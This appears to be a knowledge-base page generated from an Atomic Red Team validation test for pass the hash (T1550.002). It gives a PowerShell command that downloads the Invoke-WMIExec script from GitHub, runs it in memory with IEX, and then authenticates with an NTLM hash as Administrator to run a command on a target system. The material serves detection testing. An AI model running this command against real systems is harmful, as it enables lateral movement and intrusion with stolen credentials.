---
atomic_guid: "f8757545-b00a-4e4e-8cfb-8cfb961ee713"
title: "Invoke-WMIExec Pass the Hash"
framework: "atomic"
generated: "true"
attack_technique_id: "T1550.002"
attack_technique_name: "Use Alternate Authentication Material: Pass the Hash"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "f8757545-b00a-4e4e-8cfb-8cfb961ee713"
  - "Invoke-WMIExec Pass the Hash"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Invoke-WMIExec Pass the Hash

Use Invoke-WMIExec to Pass the Hash
Note: must dump hashes first
[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)

## Metadata

- Atomic GUID: f8757545-b00a-4e4e-8cfb-8cfb961ee713
- Technique: T1550.002: Use Alternate Authentication Material: Pass the Hash
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1550.002/T1550.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1550-use_alternate_authentication_material|T1550.002]]

## Input Arguments

### command

- description: Command to run on target system
- type: string
- default: hostname

### ntlm

- description: ntlm hash
- type: string
- default: cc36cf7a8514893efccd3324464tkg1a

### target

- description: System to run command on
- type: string
- default: $env:COMPUTERNAME

### user_name

- description: username
- type: string
- default: Administrator

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.yaml)
